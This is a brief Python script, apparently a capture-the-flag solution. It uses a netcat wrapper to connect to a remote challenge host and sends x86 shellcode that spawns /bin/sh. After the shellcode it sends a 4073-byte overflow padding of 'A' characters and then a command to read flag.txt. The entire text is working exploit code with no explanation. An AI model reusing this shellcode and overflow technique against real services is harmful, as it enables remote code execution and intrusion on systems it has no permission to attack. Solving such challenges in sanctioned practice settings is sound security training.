from v0lt.netcat import Netcat

nc = Netcat("archpichu.ddns.net", 65105)
nc.write('\x31\xc9\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')
payload = "A"*4073
nc.writeln("\n"+payload)
nc.writeln("cat flag.txt")